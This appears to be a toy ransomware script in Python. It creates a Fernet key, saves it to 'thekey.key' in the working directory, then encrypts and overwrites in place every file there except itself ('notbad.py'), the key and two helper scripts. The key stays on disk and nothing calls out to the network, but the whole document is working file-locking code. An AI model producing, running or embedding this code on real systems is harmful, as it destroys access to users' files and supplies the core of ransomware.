#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

# Generate a key and save it into a file
def write_key():
    key = Fernet.generate_key()
    with open("thekey.key", "wb") as key_file:
        key_file.write(key)

# Load the key from the current directory named 'thekey.key'
def load_key():
    return open("thekey.key", "rb").read()

# Encrypt the contents of a file
def encrypt_file(file_name, key):
    """
    Given a filename (str) and key (bytes), it encrypts the file and writes it
    """
    f = Fernet(key)

    with open(file_name, "rb") as file:
        # read all file data
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(file_name, "wb") as file:
        file.write(encrypted_data)

# Main logic
if __name__ == "__main__":
    path = '.'  # Current directory
    files = [file for file in os.listdir(path) if os.path.isfile(file) and file not in ["notbad.py", "thekey.key", "decrypt.py", "encrypt.py"]]

    write_key()  # Write the key (only run this once initially)
    secret_key = load_key()  # Load the previously generated key

    for file in files:
        encrypt_file(file, secret_key)
        print(f"File encrypted successfully: {file}")
